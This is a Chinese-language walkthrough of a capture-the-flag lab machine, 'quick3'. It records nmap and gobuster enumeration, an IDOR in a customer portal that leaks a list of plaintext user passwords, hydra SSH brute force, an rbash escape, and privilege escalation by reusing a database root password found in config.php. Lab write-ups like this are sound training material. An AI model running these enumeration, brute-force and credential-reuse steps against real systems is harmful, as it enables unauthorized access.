# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.2.0/24 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 03:52 EDT
Nmap scan report for quick3 (192.168.2.2)
Host is up (0.00055s latency).
MAC Address: 08:00:27:28:12:35 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for kali (192.168.2.15)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 3.82 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p- 192.168.2.2
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-12 03:53 EDT
Nmap scan report for quick3 (192.168.2.2)
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
MAC Address: 08:00:27:28:12:35 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds
```

# 漏洞利用

目录枚举

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -x html,txt,zip,git -u http://192.168.2.2 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.hta.zip             (Status: 403) [Size: 276]
/.hta.git             (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.git        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htaccess.zip        (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.git        (Status: 403) [Size: 276]
/.htpasswd.zip        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/404.html             (Status: 200) [Size: 5013]
/css                  (Status: 301) [Size: 308] [--> http://192.168.2.2/css/]                                                             
/customer             (Status: 301) [Size: 313] [--> http://192.168.2.2/customer/]                                                        
/fonts                (Status: 301) [Size: 310] [--> http://192.168.2.2/fonts/]                                                           
/images               (Status: 301) [Size: 311] [--> http://192.168.2.2/images/]                                                          
/img                  (Status: 301) [Size: 308] [--> http://192.168.2.2/img/]                                                             
/index.html           (Status: 200) [Size: 51414]
/index.html           (Status: 200) [Size: 51414]
/js                   (Status: 301) [Size: 307] [--> http://192.168.2.2/js/]                                                              
/lib                  (Status: 301) [Size: 308] [--> http://192.168.2.2/lib/]                                                             
/modules              (Status: 301) [Size: 312] [--> http://192.168.2.2/modules/]                                                         
/server-status        (Status: 403) [Size: 276]
Progress: 23070 / 23075 (99.98%)
===============================================================
Finished
===============================================================
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/dirb/wordlists/common.txt -x html,txt,zip,git -u http://192.168.2.2/customer/
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.2.2/customer/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,zip,git
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 276]
/.hta.git             (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.hta.html            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.hta.txt             (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess.txt        (Status: 403) [Size: 276]
/.htaccess.zip        (Status: 403) [Size: 276]
/.htaccess.git        (Status: 403) [Size: 276]
/.htpasswd.txt        (Status: 403) [Size: 276]
/.htpasswd.zip        (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.git        (Status: 403) [Size: 276]
/.hta.zip             (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 317] [--> http://192.168.2.2/customer/css/]                                                    
/fonts                (Status: 301) [Size: 319] [--> http://192.168.2.2/customer/fonts/]                                                  
/images               (Status: 301) [Size: 320] [--> http://192.168.2.2/customer/images/]                                                 
/index.php            (Status: 200) [Size: 2175]
/js                   (Status: 301) [Size: 316] [--> http://192.168.2.2/customer/js/]                                                     
/modules              (Status: 301) [Size: 321] [--> http://192.168.2.2/customer/modules/]                                                
Progress: 23070 / 23075 (99.98%)
===============================================================
Finished
===============================================================
```

发现了登录界面：http://192.168.2.2/customer/index.php，可以注册账号，注册一个登陆进去

在user.php中发现有使用id参数，尝试SQL注入

没有成功，在change password中发现，原码可以查看到密码

```
<input type="password" id="oldpassword" name="oldpassword" value="123" required="">
```

尝试更改id，存在越权

```
quick:q27QAO6FeisAAtbW
nick:H01n8X0fiiBhsNbI
andrew:oyS6518WQxGK8rmk
jack:2n5kKKcvumiR7vrz
mike:6G3UCx6aH6UYvJ6m
john:k2I9CR15E9O4G1KI
jane:62D4hqCrjjNCuxOj
frank:w9Y021wsWRdkwuKf
fred:1vC35FcnMfmGsI5c
sandra:fL01z7z8MawnIdAq
bill:vDKZtVfZuaLN8BEB7f
james:iakbmsaEVHhN2XoaXB
donald:wv5awQybZTdvZeMGPb
michelle:wv5awQybZTdvZeMGPb
jeff:Kn4tLAPWDbFK9Zv2
lee:SS2mcbW58a8reLYQ
laura:e8v3JQv3QVA3aNrD
coos:8RMVrdd82n5ymc4Z
neil:STUK2LNwNRU24YZt
teresa:mvQnTzCX9wcNtzbW
krystal:A9n3XMuB9XmFmgr5
juan:DX5cM3yFg6wJgdYb
john:yT9Hy2fhX7VhmEkj
misty:aCSKXmzhHL9XPnqr
lara:GUFTV4ERd7QAexxw
james:fMYFNFzCRMF6ceKe
dick:w5dWfAqNNLtWVvcW
anna:FVYtCpc8FGVHEBXV
```

爆破一下ssh

```
┌──(kali㉿kali)-[~]
└─$ hydra -C 1.txt ssh://192.168.2.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-12 05:02:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28 login tries, ~2 tries per task
[DATA] attacking ssh://192.168.2.2:22/
[22][ssh] host: 192.168.2.2   login: mike   password: 6G3UCx6aH6UYvJ6m                                                                    
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-12 05:02:34
┌──(kali㉿kali)-[~]
└─$ ssh mike@192.168.2.2                                        
The authenticity of host '192.168.2.2 (192.168.2.2)' can't be established.
ED25519 key fingerprint is SHA256:ldXbiUi3GQVrIk4Hrg+lHj2Sr/xuDyixjM4q4oFMfHM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.2.2' (ED25519) to the list of known hosts.
mike@192.168.2.2's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Apr 12 09:03:51 AM UTC 2026

  System load:  0.15087890625     Processes:               116
  Usage of /:   58.8% of 9.75GB   Users logged in:         0
  Memory usage: 38%               IPv4 address for enp0s3: 192.168.2.2
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

45 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
New release '24.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Wed Jan 24 12:56:53 2024 from 10.0.2.15
mike@quick3:~$
```

# 权限提升

```
mike@quick3:~$ sudo -l
[sudo] password for mike: 
Sorry, user mike may not run sudo on quick3.
mike@quick3:~$ find / -perm -u=s -type f 2>/dev/null
-rbash: /dev/null: restricted: cannot redirect output
mike@quick3:~$ bash
mike@quick3:~$ find / -perm -u=s -type f 2>/dev/null
/snap/snapd/19457/usr/lib/snapd/snap-confine
/snap/snapd/20671/usr/lib/snapd/snap-confine
/snap/core20/1974/usr/bin/chfn
/snap/core20/1974/usr/bin/chsh
/snap/core20/1974/usr/bin/gpasswd
/snap/core20/1974/usr/bin/mount
/snap/core20/1974/usr/bin/newgrp
/snap/core20/1974/usr/bin/passwd
/snap/core20/1974/usr/bin/su
/snap/core20/1974/usr/bin/sudo
/snap/core20/1974/usr/bin/umount
/snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1974/usr/lib/openssh/ssh-keysign
/snap/core20/2105/usr/bin/chfn
/snap/core20/2105/usr/bin/chsh
/snap/core20/2105/usr/bin/gpasswd
/snap/core20/2105/usr/bin/mount
/snap/core20/2105/usr/bin/newgrp
/snap/core20/2105/usr/bin/passwd
/snap/core20/2105/usr/bin/su
/snap/core20/2105/usr/bin/sudo
/snap/core20/2105/usr/bin/umount
/snap/core20/2105/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2105/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/fusermount3
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
mike@quick3:~$ getcap -r / 2>/dev/null
/snap/core20/1974/usr/bin/ping cap_net_raw=ep
/snap/core20/2105/usr/bin/ping cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
mike@quick3:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
mike@quick3:~$ ls -la /etc/cron*
-rw-r--r-- 1 root root 1136 Mar 23  2022 /etc/crontab

/etc/cron.d:
total 20
drwxr-xr-x   2 root root 4096 Jan 21  2024 .
drwxr-xr-x 100 root root 4096 Jan 24  2024 ..
-rw-r--r--   1 root root  201 Jan  8  2022 e2scrub_all
-rw-r--r--   1 root root  712 Jan 28  2022 php
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.daily:
total 36
drwxr-xr-x   2 root root 4096 Jan 21  2024 .
drwxr-xr-x 100 root root 4096 Jan 24  2024 ..
-rwxr-xr-x   1 root root  539 May  3  2023 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr  8  2022 apt-compat
-rwxr-xr-x   1 root root  123 Dec  5  2021 dpkg
-rwxr-xr-x   1 root root  377 May 25  2022 logrotate
-rwxr-xr-x   1 root root 1330 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug 10  2023 .
drwxr-xr-x 100 root root 4096 Jan 24  2024 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug 10  2023 .
drwxr-xr-x 100 root root 4096 Jan 24  2024 ..
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder

/etc/cron.weekly:
total 16
drwxr-xr-x   2 root root 4096 Aug 10  2023 .
drwxr-xr-x 100 root root 4096 Jan 24  2024 ..
-rwxr-xr-x   1 root root 1020 Mar 17  2022 man-db
-rw-r--r--   1 root root  102 Mar 23  2022 .placeholder
mike@quick3:~$ echo $PATH
/home/mike:/home/mike:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
mike@quick3:~$ find / -name "*.env" 2>/dev/null
mike@quick3:~$ find / -name "config.php" 2>/dev/null
/var/www/html/customer/config.php
mike@quick3:~$ cat /var/www/html/customer/config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
}
?>
mike@quick3:~$ su
Password: 
root@quick3:/home/mike# id
uid=0(root) gid=0(root) groups=0(root)
```
